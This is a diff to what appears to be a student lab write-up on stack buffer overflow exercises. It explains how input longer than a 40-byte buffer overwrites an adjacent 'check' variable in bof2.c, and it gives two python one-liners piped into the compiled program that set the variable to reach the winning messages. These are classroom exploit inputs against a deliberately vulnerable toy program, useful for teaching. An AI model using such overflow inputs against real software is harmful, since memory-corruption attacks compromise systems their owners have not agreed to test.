@@ -97,7 +97,28 @@ Instead of returning to its original position to continue the normal program flo
 
 ![image](https://github.com/user-attachments/assets/f6dbdf24-0a77-473c-ba52-81caa5b3aded)
 
+`Since the buffer buf is only 40 bytes, but the program reads up to 45 bytes, if we enters more than 40 characters, the excess characters will overwrite the memory occupied by check.`
 
+## II. Conducting the attack: 
+
+Every step has to be done like the attack on `bof1.c` file.
+
+If you want to print out this statement `printf("\nYou are on the right way!\n");`
+```bash
+echo $(python -c "print('a'*40 + '\x01\x02\x03\x02')") | ./bof2.out
+```
+
+![image](https://github.com/user-attachments/assets/1fb903d5-94cd-47e6-b63c-4d464a09685e)
+
+Else print out this statement `printf("Yeah! You win!\n");`
+```bash
+echo $(python -c "print('a'*40 + '\xef\xbe\xad\xde')") | ./bof2.out
+```
+
+![image](https://github.com/user-attachments/assets/4a925412-a9ee-40bf-9ab1-613e2c176069)
+
+# BOF3.c 
+## I. Interpret the attack:
 
 
 
